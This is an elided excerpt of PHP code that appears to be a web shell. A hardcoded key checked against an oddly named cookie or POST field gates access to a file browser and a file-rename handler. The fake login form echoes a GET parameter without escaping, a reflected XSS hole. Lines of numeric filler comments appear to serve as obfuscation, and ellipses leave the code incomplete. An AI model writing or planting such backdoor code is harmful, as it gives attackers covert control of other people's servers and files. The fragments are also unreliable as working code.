...
$auth_key = "bf5111cc16312206c1c92482e6dc7f6c";
...
$pass = false;
if (isset($_COOKIE['pw_name_47423'])) {
    if(($_COOKIE['pw_name_47423']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_47423'])) {
        if(($_POST['pw_name_47423']) == $auth_key) {
            setcookie("pw_name_47423", $_POST['pw_name_47423']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_47423' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726206857328530 1726206857864634 1726206857524775 1726206857228042
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726206857328530 1726206857864634 1726206857524775 1726206857228042
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726206857328530 1726206857864634 1726206857524775 1726206857228042
            $name = PATH . "/" . $_GET['r'];
